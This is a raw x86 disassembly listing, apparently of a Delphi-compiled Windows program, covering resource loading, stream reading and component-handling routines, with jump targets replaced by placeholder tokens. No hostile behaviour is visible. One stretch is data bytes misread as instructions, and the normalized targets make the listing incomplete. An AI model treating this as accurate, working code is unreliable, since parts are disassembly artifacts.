push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_41b3fc
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41b144
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_41b3fc
pop ecx
sub_41b4d8
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406a4c
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41b528
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026f4
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41b570
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_402714
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41b5a0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
mov ch 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
mov dh 0x41
add [ eax ] bl
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
adc al 0xb7
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ ecx + esi ] cl
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
and al 0xb7
inc ecx
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
pushad
mov dh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 4 + 0x41 ] ah
add [ eax ] bl
add [ eax ] al
add [ ebp + esi * 4 + 0x33a40041 ] bl
inc eax
add [ eax - 0x4bffbfcd ] dh
xor eax [ eax ]
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fdc
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40444c
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f40
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f40
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b674
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f40
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f40
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41b6cc
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fdc
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_40444c
mov al 0x1
inc ebx
sub_41b724
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41b79b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405758
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4152d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b7a2
lea eax [ ebp - 0x4 ]
call sub_405758
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_414618
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405758
mov ecx eax
mov eax esi
pop edx
call sub_40d020
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405758
sub_41b7a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41b84e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b855
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fdc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_420ed0
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407db4
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_41b870
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418304
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418304
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41814c
sub_41b8a8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_418304
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_418304
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
call sub_418198
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_41814c
sub_41b8f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_41ba89
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
call sub_418938
mov edi eax
xor edx edx
push ebp
push sub_41ba6a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ edi + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba71
mov eax [ rw-data ]
call sub_41899c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_41ba4b
push [ fs : edx ]
mov [ fs : edx ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41b9f9
push [ fs : edx ]
mov [ fs : edx ] esp
xor esi esi
jmp r-xdata
cmp esi [ edi + 0x8 ]
jl r-xdata
mov edx esi
mov eax edi
call sub_4182a8
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_417c68
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba00
mov eax [ ebp - 0x8 ]
call sub_403174
retn
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_4148a0
test eax eax
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b870
pop ecx
mov edx esi
mov eax edi
call sub_418198
mov eax ebx
call sub_403174
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov eax [ ebp - 0xc ]
call sub_41b7a8
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
push ebp
mov eax [ ebx + 0x4 ]
call sub_41b8a8
pop ecx
inc esi
sub_41ba00
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
and [ edi + 0x1c ] 0xff7f
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4182a8
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
sub_41ba98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418938
mov edi eax
xor eax eax
push ebp
push sub_41bb33
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
mov edx ebx
mov eax edi
call sub_4182a8
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx ebx
mov eax edi
call sub_418198
mov eax esi
call sub_403174
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_407db4
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_41bb44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418938
mov edi eax
xor eax eax
push ebp
push sub_41bbbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
mov edx ebx
mov eax edi
call sub_4182a8
mov esi eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax edi
call sub_418198
mov eax esi
call sub_403174
sub_41bbec
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
pop ecx
pop edx
pop ebx
retn
sub_41bc30
push ebx
push esi
push edi
call sub_403528
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
sub edx [ esi + 0x14 ]
mov eax [ esi + 0x4 ]
mov cx 0x1
mov edi [ eax ]
call [ edi + 0x14 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b570
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_41bc6c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_41db44
cmp bl al
je r-xdata
pop esi
pop ebx
retn
dec [ esi + 0x10 ]
mov eax esi
call sub_41dc54
call sub_41bbe0
sub_41bc90
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_407db4
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
lea eax [ ebx + 0x70 ]
call sub_403eec
sub_41bcc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_407db4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db44
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bd85
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_41c108
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41c108
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bd8c
mov eax [ ebp - 0x8 ]
call sub_403174
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41dc54
mov eax [ ebp - 0x4 ]
mov [ eax + 0x78 ] 0x1
call sub_41bbe0
sub_41bdb4
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_41bdd4
push ebx
push esi
push edi
add esp 0xfffffef8
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ esp + 0x8 ]
mov edx esi
mov ecx 0xff
call sub_404188
lea edx [ esp + 0x8 ]
mov eax [ edi ]
call sub_4033e0
mov [ esp ] eax
cmp [ esp ] 0x0
sete [ esp + 0x4 ]
cmp [ ebx + 0x3a ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
push esp
lea eax [ esp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ esp ]
add esp 0x108
pop edi
pop esi
pop ebx
retn
call sub_41bbe0
sub_41be3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_418938
mov esi eax
xor edx edx
push ebp
push sub_41beac
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41beb3
mov eax [ rw-data ]
call sub_41899c
retn
mov edx ebx
mov eax esi
call sub_4182a8
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_403174
mov edx ebx
mov eax esi
call sub_418198
sub_41beb8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41bfc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bfce
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
xor edx edx
push ebp
push sub_41bfaa
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bffc
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41b6cc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4182a8
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f84
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_41b7a8
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4182a8
call sub_41be3c
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4182a8
mov edx eax
mov eax [ rw-data ]
call sub_4188b0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_4183f4
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_41bfd8
push ebx
mov ebx eax
mov eax ebx
call sub_41c0cc
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41aae4
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_41bffc
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_403174
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4182a8
call sub_403174
inc edi
dec esi
jne r-xdata
sub_41c038
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_4030bc
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_417734
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403100
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_4177ac
mov edi eax
mov edx [ esp + 0x4 ]
call sub_4176ac
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_4030d8
test al al
jne r-xdata
sub_41c108
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_41c154
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_41c154
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
sub_41c1a4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41c1ef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d9a4
mov eax [ ebp - 0x4 ]
call sub_4041ac
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c1f6
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
call sub_41bbe0
sub_41c1fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c29c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bda0
test al al
jne r-xdata
mov eax ebx
call sub_41bda0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419210
jmp r-xdata
mov eax ebx
call sub_41c0e4
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41cd0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c2a3
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_419144
mov esi eax
mov eax ebx
call sub_41cd04
jmp r-xdata
mov eax ebx
call sub_41cc54
mov eax ebx
call sub_41bda0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41ce70
mov eax ebx
call sub_41cd0c
sub_41c2cc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_41814c
inc esi
dec ebx
jne r-xdata
sub_41c308
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_420fec
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee4
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050a0
add esp 0x4
mov edx ebx
mov eax edi
call sub_420fc0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_420fc0
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c380
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404ee4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c3e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c408
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402784
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c3e8
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41de38
call sub_402784
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403174
sub_41c468
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c54e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dfd8
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c522
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
